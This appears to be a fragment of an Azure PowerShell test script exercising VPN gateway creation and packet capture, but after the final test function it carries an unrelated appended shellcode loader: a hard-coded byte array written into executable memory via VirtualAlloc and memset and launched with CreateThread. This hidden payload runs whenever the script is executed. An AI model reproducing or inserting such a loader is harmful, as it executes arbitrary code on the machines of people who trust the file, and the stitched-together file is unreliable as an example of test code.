		$samplePublicCertData = "MIIDUzCCAj+gAwIBAgIQRggGmrpGj4pCblTanQRNUjAJBgUrDgMCHQUAMDQxEjAQBgNVBAoTCU1pY3Jvc29mdDEeMBwGA1UEAxMVQnJrIExpdGUgVGVzdCBSb290IENBMB4XDTEzMDExOTAwMjQxOFoXDTIxMDExOTAwMjQxN1owNDESMBAGA1UEChMJTWljcm9zb2Z0MR4wHAYDVQQDExVCcmsgTGl0ZSBUZXN0IFJvb3QgQ0EwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC7SmE+iPULK0Rs7mQBO/6a6B6/G9BaMxHgDGzAmSG0Qsyt5e08aqgFnPdkMl3zRJw3lPKGha/JCvHRNrO8UpeAfc4IXWaqxx2iBipHjwmHPHh7+VB8lU0EJcUe7WBAI2n/sgfCwc+xKtuyRVlOhT6qw/nAi8e5don/iHPU6q7GCcnqoqtceQ/pJ8m66cvAnxwJlBFOTninhb2VjtvOfMQ07zPP+ZuYDPxvX5v3nd6yDa98yW4dZPuiGO2s6zJAfOPT2BrtyvLekItnSgAw3U5C0bOb+8XVKaDZQXbGEtOw6NZvD4L2yLd47nGkN2QXloiPLGyetrj3Z2pZYcrZBo8hAgMBAAGjaTBnMGUGA1UdAQReMFyAEOncRAPNcvJDoe4WP/gH2U+hNjA0MRIwEAYDVQQKEwlNaWNyb3NvZnQxHjAcBgNVBAMTFUJyayBMaXRlIFRlc3QgUm9vdCBDQYIQRggGmrpGj4pCblTanQRNUjAJBgUrDgMCHQUAA4IBAQCGyHhMdygS0g2tEUtRT4KFM+qqUY5HBpbIXNAav1a1dmXpHQCziuuxxzu3iq4XwnWUF1OabdDE2cpxNDOWxSsIxfEBf9ifaoz/O1ToJ0K757q2Rm2NWqQ7bNN8ArhvkNWa95S9gk9ZHZLUcjqanf0F8taJCYgzcbUSp+VBe9DcN89sJpYvfiBiAsMVqGPc/fHJgTScK+8QYrTRMubtFmXHbzBSO/KTAP5rBTxse88EGjK5F8wcedvge2Ksk6XjL3sZ19+Oj8KTQ72wihN900p1WQldHrrnbixSpmHBXbHr9U0NQigrJp5NphfuU5j81C8ixvfUdwyLmTv7rNA7GTAD";
		$rootCert = New-AzVpnClientRootCertificate -Name $clientRootCertName -PublicCertData $samplePublicCertData

		
		$subnet = New-AzVirtualNetworkSubnetConfig -Name "GatewaySubnet" -AddressPrefix 10.0.0.0/24
		$vnet = New-AzVirtualNetwork -Name $vnetName -ResourceGroupName $rgname -Location $location -AddressPrefix 10.0.0.0/16 -Subnet $subnet
		$vnet = Get-AzVirtualNetwork -Name $vnetName -ResourceGroupName $rgname      
		$subnet = Get-AzVirtualNetworkSubnetConfig -Name "GatewaySubnet" -VirtualNetwork $vnet

		
		$publicip = New-AzPublicIpAddress -ResourceGroupName $rgname -name $publicIpName -location $location -AllocationMethod Dynamic -DomainNameLabel $domainNameLabel
		$vnetIpConfig = New-AzVirtualNetworkGatewayIpConfig -Name $vnetGatewayConfigName -PublicIpAddress $publicip -Subnet $subnet
      
		
		New-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $rname -location $location -IpConfigurations $vnetIpConfig -GatewayType Vpn -VpnType RouteBased -EnableBgp $false -GatewaySku VpnGw1 -VpnClientAddressPool 201.169.0.0/16 -VpnClientRootCertificates $rootCert
		$actual = Get-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $rname
		Assert-AreEqual "VpnGw1" $actual.Sku.Tier
		$protocols = $actual.VpnClientConfiguration.VpnClientProtocols
		Assert-AreEqual 2 @($protocols).Count
		Assert-AreEqual "201.169.0.0/16" $actual.VpnClientConfiguration.VpnClientAddressPool.AddressPrefixes 
		
		$vpnclientHealthDetails = Get-AzVirtualNetworkGatewayVpnClientConnectionHealth -ResourceGroupName $rgname -ResourceName $rname
		Assert-AreEqual 0 @($vpnclientHealthDetails).Count
	}
	finally
    {
		
        Clean-ResourceGroup $rgname
    }
}


function Test-VirtualNetworKGatewayPacketCapture
{
    
    $rgname = Get-ResourceGroupName
    $rname = Get-ResourceName
    $domainNameLabel = Get-ResourceName
    $vnetName = Get-ResourceName
    $publicIpName = Get-ResourceName
    $vnetGatewayConfigName = Get-ResourceName
    $rglocation = Get-ProviderLocation ResourceManagement "WestCentralUS"
    $resourceTypeParent = "Microsoft.Network/virtualNetworkGateways"
    $location = Get-ProviderLocation $resourceTypeParent "WestCentralUS"
    try 
     {
      
      $resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" } 
      
      
	  if ((Get-NetworkTestMode) -ne 'Playback')
	  {
	       $storetype = 'Standard_GRS'
           $containerName = "testcontainer"
           $storeName = 'sto' + $rgname;
           New-AzStorageAccount -ResourceGroupName $rgname -Name $storeName -Location $location -Type $storetype
           $key = Get-AzStorageAccountKey -ResourceGroupName $rgname -Name $storeName
           $context = New-AzStorageContext -StorageAccountName $storeName -StorageAccountKey $key[0].Value
           New-AzStorageContainer -Name $containerName -Context $context
           $container = Get-AzStorageContainer -Name $containerName -Context $context
           $now=get-date
           $sasurl = New-AzureStorageContainerSASToken -Name $containerName -Context $context -Permission "rwd" -StartTime $now.AddHours(-1) -ExpiryTime $now.AddDays(1) -FullUri
	  }
	  else
	  {
	       $sasurl = "https://storage/test123?sp=racwdl&stvigopKcy"
	  }

      
      $subnet = New-AzVirtualNetworkSubnetConfig -Name "GatewaySubnet" -AddressPrefix 10.0.0.0/24
      $vnet = New-AzVirtualNetwork -Name $vnetName -ResourceGroupName $rgname -Location $location -AddressPrefix 10.0.0.0/16 -Subnet $subnet
      $vnet = Get-AzVirtualNetwork -Name $vnetName -ResourceGroupName $rgname
      $subnet = Get-AzVirtualNetworkSubnetConfig -Name "GatewaySubnet" -VirtualNetwork $vnet

      
      $publicip = New-AzPublicIpAddress -ResourceGroupName $rgname -name $publicIpName -location $location -AllocationMethod Dynamic -DomainNameLabel $domainNameLabel    

      
      $vnetIpConfig = New-AzVirtualNetworkGatewayIpConfig -Name $vnetGatewayConfigName -PublicIpAddress $publicip -Subnet $subnet
      $job = New-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $rname -location $location -IpConfigurations $vnetIpConfig -GatewayType Vpn -VpnType RouteBased -EnableBgp $false -AsJob
      $job | Wait-Job
      $actual = $job | Receive-Job
      $gateway = Get-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $rname
      Assert-AreEqual $gateway.ResourceGroupName $actual.ResourceGroupName	
      Assert-AreEqual $gateway.Name $actual.Name	
      Assert-AreEqual "Vpn" $gateway.GatewayType
      Assert-AreEqual "RouteBased" $gateway.VpnType

      
      $output = Start-AzVirtualnetworkGatewayPacketCapture -ResourceGroupName  $rgname -Name $rname
      Assert-AreEqual $gateway.ResourceGroupName $output.ResourceGroupName	
      Assert-AreEqual $gateway.Name $output.Name
      Assert-AreEqual $gateway.ResourceGroupName $output.ResourceGroupName	
      Assert-AreEqual $gateway.Location $output.Location
      Assert-AreEqual $output.Code "Succeeded"

      
      $output = Stop-AzVirtualnetworkGatewayPacketCapture -ResourceGroupName  $rgname -Name $rname -SasUrl $sasurl
      Assert-AreEqual $gateway.ResourceGroupName $output.ResourceGroupName	
      Assert-AreEqual $gateway.Name $output.Name
      Assert-AreEqual $gateway.ResourceGroupName $output.ResourceGroupName	
      Assert-AreEqual $gateway.Location $output.Location
      Assert-AreEqual $output.Code "Succeeded"

      
	  $a="{`"TracingFlags`":11,`"MaxPacketBufferSize`":120,`"MaxFileSize`":500,`"Filters`":[{`"SourceSubnets`":[`"10.19.0.4/32`",`"10.20.0.4/32`"],`"DestinationSubnets`":[`"10.20.0.4/32`",`"10.19.0.4/32`"],`"IpSubnetValueAsAny`":true,`"TcpFlags`":-1,`"PortValueAsAny`":true,`"CaptureSingleDirectionTrafficOnly`":true}]}"
      $output = Start-AzVirtualnetworkGatewayPacketCapture -InputObject $gateway -FilterData $a
      Assert-AreEqual $gateway.ResourceGroupName $output.ResourceGroupName	
      Assert-AreEqual $gateway.Name $output.Name
      Assert-AreEqual $gateway.ResourceGroupName $output.ResourceGroupName	
      Assert-AreEqual $gateway.Location $output.Location
      Assert-AreEqual $output.Code "Succeeded"

      
      $output = Stop-AzVirtualnetworkGatewayPacketCapture -InputObject $gateway -SasUrl $sasurl
      Assert-AreEqual $gateway.ResourceGroupName $output.ResourceGroupName	
      Assert-AreEqual $gateway.Name $output.Name
      Assert-AreEqual $gateway.ResourceGroupName $output.ResourceGroupName	
      Assert-AreEqual $gateway.Location $output.Location
      Assert-AreEqual $output.Code "Succeeded"

      
      $job = Remove-AzVirtualNetworkGateway -ResourceGroupName $actual.ResourceGroupName -name $rname -PassThru -Force -AsJob
      $job | Wait-Job
      $delete = $job | Receive-Job
      Assert-AreEqual true $delete
      
      $list = Get-AzVirtualNetworkGateway -ResourceGroupName $actual.ResourceGroupName
      Assert-AreEqual 0 @($list).Count
     }
     finally
     {
        
        Clean-ResourceGroup $rgname
     }
}
$T72 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $T72 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0xe1,0x8b,0x75,0x96,0xdb,0xd7,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x42,0x13,0x03,0x42,0x13,0x83,0xea,0x1d,0x69,0x80,0x6a,0x35,0xec,0x6b,0x93,0xc5,0x91,0xe2,0x76,0xf4,0x91,0x91,0xf3,0xa6,0x21,0xd1,0x56,0x4a,0xc9,0xb7,0x42,0xd9,0xbf,0x1f,0x64,0x6a,0x75,0x46,0x4b,0x6b,0x26,0xba,0xca,0xef,0x35,0xef,0x2c,0xce,0xf5,0xe2,0x2d,0x17,0xeb,0x0f,0x7f,0xc0,0x67,0xbd,0x90,0x65,0x3d,0x7e,0x1a,0x35,0xd3,0x06,0xff,0x8d,0xd2,0x27,0xae,0x86,0x8c,0xe7,0x50,0x4b,0xa5,0xa1,0x4a,0x88,0x80,0x78,0xe0,0x7a,0x7e,0x7b,0x20,0xb3,0x7f,0xd0,0x0d,0x7c,0x72,0x28,0x49,0xba,0x6d,0x5f,0xa3,0xb9,0x10,0x58,0x70,0xc0,0xce,0xed,0x63,0x62,0x84,0x56,0x48,0x93,0x49,0x00,0x1b,0x9f,0x26,0x46,0x43,0x83,0xb9,0x8b,0xff,0xbf,0x32,0x2a,0xd0,0x36,0x00,0x09,0xf4,0x13,0xd2,0x30,0xad,0xf9,0xb5,0x4d,0xad,0xa2,0x6a,0xe8,0xa5,0x4e,0x7e,0x81,0xe7,0x06,0xb3,0xa8,0x17,0xd6,0xdb,0xbb,0x64,0xe4,0x44,0x10,0xe3,0x44,0x0c,0xbe,0xf4,0xab,0x27,0x06,0x6a,0x52,0xc8,0x77,0xa2,0x90,0x9c,0x27,0xdc,0x31,0x9d,0xa3,0x1c,0xbe,0x48,0x59,0x18,0x28,0xb3,0x36,0x23,0xc4,0x5b,0x45,0x24,0x15,0x27,0xc0,0xc2,0x45,0x07,0x83,0x5a,0x25,0xf7,0x63,0x0b,0xcd,0x1d,0x6c,0x74,0xed,0x1d,0xa6,0x1d,0x87,0xf1,0x1f,0x75,0x3f,0x6b,0x3a,0x0d,0xde,0x74,0x90,0x6b,0xe0,0xff,0x17,0x8b,0xae,0xf7,0x52,0x9f,0x46,0xf8,0x28,0xfd,0xc0,0x07,0x87,0x68,0xec,0x9d,0x2c,0x3b,0xbb,0x09,0x2f,0x1a,0x8b,0x95,0xd0,0x49,0x80,0x1c,0x45,0x32,0xfe,0x60,0x89,0xb2,0xfe,0x36,0xc3,0xb2,0x96,0xee,0xb7,0xe0,0x83,0xf0,0x6d,0x95,0x18,0x65,0x8e,0xcc,0xcd,0x2e,0xe6,0xf2,0x28,0x18,0xa9,0x0d,0x1f,0x98,0x95,0xdb,0x59,0xee,0xf7,0xdf;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$94j2=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($94j2.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$94j2,0,0,0);for (;;){Start-sleep 60};

